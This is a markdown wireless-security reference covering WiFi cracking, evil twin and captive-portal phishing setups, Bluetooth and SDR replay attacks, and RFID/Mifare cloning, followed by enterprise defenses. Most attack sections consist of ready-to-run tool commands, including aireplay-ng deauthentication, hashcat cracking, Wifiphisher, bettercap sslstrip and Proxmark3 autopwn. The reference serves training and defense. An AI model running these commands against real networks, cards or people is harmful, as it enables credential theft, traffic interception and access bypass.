# Wireless Security Reference

WiFi attack techniques, Bluetooth security, SDR attacks, rogue access points, and enterprise wireless defense. Complements the [Radio Frequency Security](disciplines/radio-frequency-security.md) and [Network Security](disciplines/network-security.md) discipline pages.

---

## WiFi Attack Techniques

### WPA2 Personal Attacks

**PMKID Attack (Clientless WPA2 Cracking)**
```bash
# No client required — capture PMKID from AP beacon/probe response
# PMKID = HMAC-SHA1-128(PMK, "PMK Name" + AP_MAC + Client_MAC)

# hcxdumptool capture
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1
# Wait for PMKID in output: [FOUND PMKID]

# Convert to hashcat format
hcxpcapngtool -o hashes.hc22000 capture.pcapng

# Crack
hashcat -m 22000 hashes.hc22000 /path/to/wordlist.txt
hashcat -m 22000 hashes.hc22000 -a 3 ?l?l?l?l?l?l?l?l    # 8-char lowercase bruteforce
```

**4-Way Handshake Capture**
```bash
# Step 1: Enable monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
# Or: sudo airmon-ng start wlan0

# Step 2: Identify target AP
sudo airodump-ng wlan0

# Step 3: Capture handshake on target channel/BSSID
sudo airodump-ng -c CHANNEL --bssid AP_MAC -w capture wlan0

# Step 4: Deauthenticate a client to force reconnect (triggers handshake)
sudo aireplay-ng -0 2 -a AP_MAC -c CLIENT_MAC wlan0

# Step 5: Wait for handshake (shown in airodump-ng: WPA handshake: AP_MAC)

# Step 6: Crack with hashcat
# Convert old format to new
hcxpcapngtool -o hashes.hc22000 capture-01.cap
hashcat -m 22000 hashes.hc22000 wordlist.txt
hashcat -m 22000 hashes.hc22000 -r rules/best64.rule wordlist.txt
```

**WPA2 Offline Cracking Wordlists and Rules**
```bash
# Wordlists
# rockyou.txt — 14M passwords from RockYou breach
# SecLists/Passwords/ — curated password collections
# crackstation.net — 1.5B password list (torrent)

# Hashcat rules (transform wordlist entries)
# best64.rule — 64 common transformations (good first pass)
# dive.rule — aggressive (Hob0Rules)
# T0XlC.rule — common substitutions

# Mask attacks (pattern-based)
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?d?d?d?d   # UllldDDD pattern
hashcat -m 22000 hash.hc22000 -a 3 --increment ?l?l?l?l?l?l?l?l?l?l  # 4-10 lowercase

# Example: crack ISP-issued router default passwords (often pattern-based)
# BT Home Hub: 10 lowercase chars
hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?l?l?l?l?l
```

### WPA3 and Dragonblood Attacks

WPA3 uses Simultaneous Authentication of Equals (SAE) replacing PSK. Dragonblood (2019) found side-channel attacks against SAE.

```
Dragonblood attack types:
1. Downgrade attacks: Force WPA2 if AP supports WPA2/WPA3 transition mode
2. Cache-based side-channel: Timing attack on SAE commit frame
3. Timing-based side-channel: Server response timing reveals password info

Defense: Disable WPA2 transition mode; use WPA3-only SAE
Mitigation: Apply vendor firmware patches from April 2019+
```

### WPA2 Enterprise Attacks

WPA2-Enterprise uses 802.1X authentication (RADIUS). Attacks target the EAP method or the certificate validation.

**Evil Twin / Rogue RADIUS Attack**
```bash
# Hostapd-WPE (Wireless Pwnage Edition) — captures MSCHAPV2 credentials
# Used when clients don't validate server certificate

# Setup hostapd-wpe with matching SSID
hostapd-wpe hostapd-wpe.conf
# On client connection: captures MSCHAPv2 username + challenge + response

# Crack MSCHAPv2 with hashcat
hashcat -m 5500 ntlmhash.txt wordlist.txt     # NTLMv1
hashcat -m 5600 ntlmhash.txt wordlist.txt     # NTLMv2 (MSCHAPv2)
# Or use asleap for dictionary attack
asleap -f capture.dump -r wordlist.txt

# With eaphammer — automates evil twin for enterprise WPA
git clone https://github.com/s0lst1c3/eaphammer
sudo python3 eaphammer --bssid AP_MAC --channel 6 --interface wlan0 \
  --essid "Corporate-WiFi" --creds --pmf-disable
```

**Defense**: Always validate server certificate (pin CA certificate in supplicant configuration); use EAP-TLS (certificate-based, no password).

---

## Rogue Access Points

### Evil Twin Attack

```bash
# Create rogue AP with matching SSID to capture credentials or MitM traffic

# Method 1: hostapd + dnsmasq (open network evil twin)
# hostapd.conf:
interface=wlan0
driver=nl80211
ssid=Target-WiFi-Name
hw_mode=g
channel=6
macaddr_acl=0

# dnsmasq.conf (DHCP + DNS):
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1   # All DNS to captive portal

# Method 2: airbase-ng
sudo airbase-ng -e "Target-WiFi" -c 6 wlan0
sudo ifconfig at0 10.0.0.1/24 up
# Setup DHCP/NAT/captive portal

# Method 3: Flipper Zero WiFi Dev Board or Pineapple WiFi
# WiFi Pineapple Mark VII: automated evil twin, captive portal, recon
```

### Captive Portal Phishing

```bash
# Serve phishing login page to clients on rogue AP
# Tools: Wifiphisher, airgeddon, bettercap

# Wifiphisher — automated evil twin + phishing
sudo wifiphisher --essid "Target-Corp-WiFi" --phishing-pages oauth-login

# bettercap — comprehensive wireless MitM
sudo bettercap
> wifi.recon on
> set wifi.ap.ssid "Target-WiFi"
> wifi.ap on
> set http.proxy.sslstrip true
> http.proxy on
```

---

## Wireless Network Discovery and Enumeration

```bash
# Passive scanning (no packets sent)
sudo airodump-ng wlan0
# Columns: BSSID (AP MAC), PWR (signal), Beacons, #Data, CH, MB, ENC, CIPHER, AUTH, ESSID

# Active scan with iw
sudo iw dev wlan0 scan | grep -E "SSID|signal|security"

# Enumerate hidden SSIDs (probe for specific SSIDs in responses)
sudo airodump-ng wlan0  # Hidden shows <length: X>
# Deauth client → capture probe request with real SSID

# Wardriving tools
# Kismet — passive wireless IDS and discovery
sudo kismet -c wlan0
# Output: KismetDB, pcap, CSV

# WiGLE — upload wardriving data to wigle.net (crowdsourced WiFi map)
```

---

## Bluetooth Attacks

### Bluetooth Enumeration

```bash
# Scan for nearby Bluetooth devices
bluetoothctl
> scan on
> devices    # List discovered devices
> info DEVICE_MAC   # Get device details

# hcitool (legacy but still useful)
hcitool scan             # Classic Bluetooth
hcitool lescan           # Bluetooth Low Energy

# btlejuice / BTLE-Sniffer (BLE MitM)
# gatttool — interact with GATT services
gatttool -b DEVICE_MAC -I
> connect
> primary       # List GATT services
> characteristics   # List characteristics
> char-read-hnd 0x000b   # Read characteristic
```

### Bluetooth Attack Vectors

| Attack | Bluetooth Version | Description | Tool |
|---|---|---|---|
| BlueSnarfing | Classic BT (v1.x-2.x) | Unauthorized access to contacts, calendar, messages | BlueZ utilities |
| BlueJacking | Classic BT | Send unsolicited messages/files via OBEX | Custom scripts |
| KNOB (Key Negotiation of Bluetooth) | Classic BT (all) | Force entropy reduction in BR/EDR encryption | PoC by researchers |
| BIAS (Bluetooth Impersonation Attack) | Classic BT (all) | Impersonate paired device without key | PoC by researchers |
| BLE Sniffing | BLE | Capture BLE advertising packets (often unencrypted) | Wireshark + Ubertooth, HackRF |
| BLE Cloning | BLE | Clone BLE device MAC/identity for access control bypass | Flipper Zero, nRF52 dongle |
| BlueBorne | All Bluetooth | 8 vulnerabilities for RCE without pairing | Patched — ensure firmware updated |
| BLESA (BLE Spoofing Attacks) | BLE | Spoof reconnection to already-paired device | PoC available |

### Ubertooth for Bluetooth Analysis

```bash
# Ubertooth One — USB Bluetooth sniffer for classic BT
# Capture Bluetooth packets
ubertooth-btle -f -c capture.pcap    # BLE passive scan/follow
ubertooth-util -S                    # Spectrum analysis
ubertooth-rx -U 0 -d capture.pcap   # Classic BT capture

# Wireshark + Ubertooth live capture
mkfifo /tmp/bt_pipe
ubertooth-btle -f -c /tmp/bt_pipe &
wireshark -k -i /tmp/bt_pipe
```

---

## SDR (Software Defined Radio) Security

### SDR Tools and Hardware

| Tool/Hardware | Frequency Range | Use Case | Cost |
|---|---|---|---|
| RTL-SDR (RTL2832U) | 24-1766 MHz | Passive receive — weather, ADS-B, FM, pager decoding | $25-40 |
| HackRF One | 1 MHz - 6 GHz | Transmit and receive — full duplex pentesting | $300-350 |
| YARD Stick One | 300-928 MHz | Sub-GHz attacks — garage doors, key fobs, ISM band | $100 |
| Flipper Zero | 300-928 MHz | Sub-GHz read/replay, NFC, RFID, IR, Bluetooth | $170 |
| LimeSDR Mini | 10 MHz - 3.5 GHz | Full transmit/receive — GSM testing | $160 |
| Ettus USRP B200 | 70 MHz - 6 GHz | High-quality research SDR | $700+ |

### Common SDR Attacks

**Sub-GHz Replay Attacks (Key Fobs, Garage Doors)**
```bash
# RTL-SDR + GNU Radio or URH (Universal Radio Hacker)
# 1. Capture signal (garage door opener, gate remote)
# 2. Replay captured signal
# YARD Stick One with RFCat:
rfcat -r
d.setFreq(315000000)    # 315 MHz (common US garage door freq)
d.setMdmModulation(MOD_ASK_OOK)
# Transmit captured bytes
d.RFxmit(bytes)

# Flipper Zero: Sub-GHz → Read → Save → Send (point and capture garage door opener)
```

**RollJam Attack (Rolling Code Bypass)**
```
Rolling codes (used by modern cars, garage doors) change after each use.
RollJam attack:
1. Jammer: Transmit on target frequency to prevent signal reaching receiver
2. Receiver: Capture the blocked signal (code 1)
3. When victim presses again: Capture code 2, transmit code 1 (opens lock)
4. Now hold code 2 for replay later

Hardware: Two SDR dongles + GNU Radio
Target: Most 433/315 MHz rolling code systems (Keeloq, etc.)
Defense: Use UWB-based proximity (Apple U1 chip), encrypted rolling codes with time-binding
```

**ADS-B Aircraft Spoofing**
```bash
# Receive: dump1090 decodes ADS-B on 1090 MHz
dump1090 --interactive --net
# View at localhost:8080

# Inject false aircraft (requires HackRF + legal authorization)
# ADS-B Exchange: exchange real data
```

**Pager Interception**
```bash
# POCSAG and FLEX pager protocols transmit in cleartext on ~152-169 MHz
# RTL-SDR + multimon-ng
rtl_fm -f 152.85M -s 22050 | multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -
# Hospital, first responder pagers often contain PII/PHI in cleartext
```

---

## RFID and NFC Attacks

### RFID Frequency Reference

| Frequency | Standard | Example Uses | Security |
|---|---|---|---|
| 125 kHz (LF) | EM4100, HID Prox, AWID | Building access cards, animal tags | No encryption — trivially clonable |
| 13.56 MHz (HF) | Mifare Classic, NTAG, ISO 15693 | Building access, transit cards, NFC | Mifare Classic: broken crypto (Crypto-1); NTAG: no encryption |
| 13.56 MHz | Mifare DESFire EV1/EV2/EV3 | High-security access, transit | AES-128 encrypted; secure if implemented correctly |
| 13.56 MHz | ISO 14443-A/B | Payment cards (EMV), passports | Chip+PIN encrypted; contactless limited |
| 13.56 MHz | NFC (NFC-A, NFC-B, NFC-F) | Phones, tap-to-pay, smart posters | Application-layer security varies |
| 860-960 MHz (UHF) | EPC Gen2, RAIN RFID | Inventory tags, supply chain | Usually no encryption |

### RFID Attack Techniques

**125 kHz Cloning**
```bash
# Proxmark3 — industry standard RFID/NFC research tool
pm3 # Launch Proxmark3 console
pm3 --> hf search              # Search for NFC/HF cards
pm3 --> lf search              # Search for LF cards (125 kHz)
pm3 --> lf hid read            # Read HID Prox card
pm3 --> lf hid clone --r CARDDATA  # Clone to T5577 blank card

# Flipper Zero
# NFC → Read (13.56 MHz); RFID → Read (125 kHz)
# Save → Emulate (present Flipper as the card)
```

**Mifare Classic Attack (Nested Authentication)**
```bash
# Mifare Classic uses Crypto-1 — broken cipher
# Default keys: 0xFFFFFFFFFFFF, 0xA0A1A2A3A4A5, 0xD3F7D3F7D3F7

pm3 --> hf mf chk --1k -f mfc_default_keys.dic  # Try default keys
pm3 --> hf mf autopwn                             # Automated attack — crack all sectors
# Then read all sectors
pm3 --> hf mf dump --1k
# Or clone to another Mifare Classic card
pm3 --> hf mf cload -f hf-mf-XXXX.bin
```

**NFC Relay Attack**
```
Relay attack: Two devices (one near reader, one near card) relay NFC signals
Allows: Using card from a distance (across room or building)
Tools: NFCGate (Android), Proxmark3 with NFCGate integration
Defense: Transaction limit + distance bounding protocols (UWB)
```

---

## Enterprise Wireless Security

### 802.1X Authentication Architecture

```
Client → Authenticator (AP/Switch) → Authentication Server (RADIUS)
              ↑
         EAP over LAN (EAPOL)

EAP Methods (secure to insecure):
EAP-TLS (strongest): Client + server certificate; mutual authentication
EAP-PEAP/MSCHAPv2: Server cert only; username/password (vulnerable to evil twin without cert pinning)
EAP-TTLS/PAP: Server cert + PAP inner method; plaintext password in tunnel
LEAP: Broken — Cisco legacy; never use
EAP-FAST: Cisco alternative to PEAP; PAC-based; more complex
```

**Recommended Enterprise WiFi Architecture**:
```
1. Authentication: WPA3-Enterprise with EAP-TLS (client certificates)
2. Certificate authority: Internal PKI; push client certs via MDM/GPO
3. RADIUS: NPS (Microsoft) or FreeRADIUS; failover pair
4. Segmentation: Employee VLAN, Guest VLAN, IoT VLAN — separate subnet/firewall policy per network
5. Wireless IDS: Detect rogue APs, deauth flooding, evil twins
6. Certificate pinning: Configure supplicant to require specific CA/certificate subject
```

### Wireless IDS/IPS Controls

| Threat | Detection Method | Tool |
|---|---|---|
| Rogue AP | Compare detected SSIDs to authorized list | Cisco Wireless Controller, Juniper Mist, Aruba |
| Evil Twin | Detect BSSID mismatch for known SSID | WIDS/WIPS in enterprise AP controllers |
| Deauth flooding | Count 802.11 management frame deauth rate per AP | WIDS alert on deauth flood |
| WPA handshake capture | Monitor for clients being deauthed repeatedly | Alert on client being deauthed > 3x in 60s |
| Unauthorized client | MAC filtering + 802.1X + rogue client detection | AP controller authorization lists |
| BLE beacon flood | Count BLE advertising packets from unknown devices | Enterprise BLE gateway management |

### Wireless Security Standards

- **IEEE 802.11i**: Foundation for WPA2 — CCMP/AES encryption
- **IEEE 802.11w (PMF)**: Protected Management Frames — prevents deauth attacks
- **WPA3-SAE**: Replaces PSK with SAE (Dragonfly key exchange) — forward secrecy
- **WPA3-Enterprise 192-bit mode**: CNSA suite — 192-bit encryption for government/high-security
- **IEEE 802.1X**: Port-based network access control — requires authentication before network access

## Related Resources
- [Radio Frequency Security](disciplines/radio-frequency-security.md) — RF attack techniques and SDR tooling
- [Physical Security](disciplines/physical-security.md) — RFID cloning in physical pen testing
- [Hacker Hobbies](disciplines/hacker-hobbies.md) — SDR, ham radio, badge hacking
- [Network Security](disciplines/network-security.md) — Wireless IDS integration in NSM
- [Enterprise Security Controls](ENTERPRISE_SECURITY_CONTROLS.md) — Enterprise wireless policy
